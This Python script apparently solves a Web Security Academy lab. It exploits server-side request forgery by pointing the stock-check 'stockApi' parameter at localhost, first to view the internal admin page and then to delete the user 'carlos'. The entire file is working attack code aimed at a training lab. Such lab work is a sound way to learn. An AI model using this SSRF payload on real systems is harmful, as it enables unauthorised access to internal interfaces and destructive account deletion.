import requests

# Lab's stock check endpoint (external-facing)
stock_url = 'https://0a8200be033e7daa8362b01d004500d6.web-security-academy.net/product/stock'

# Step 1: SSRF to access the admin interface (optional, just to view)
payload_view_admin = {
    'stockApi': 'http://localhost/admin'
}

response = requests.post(stock_url, data=payload_view_admin)
print("[*] Admin page response:")
print(response.text)

# Step 2: SSRF to delete user 'carlos' via internal request
payload_delete_carlos = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
}

delete_response = requests.post(stock_url, data=payload_delete_carlos)
print("\n[*] Delete carlos response:")
print(delete_response.text)
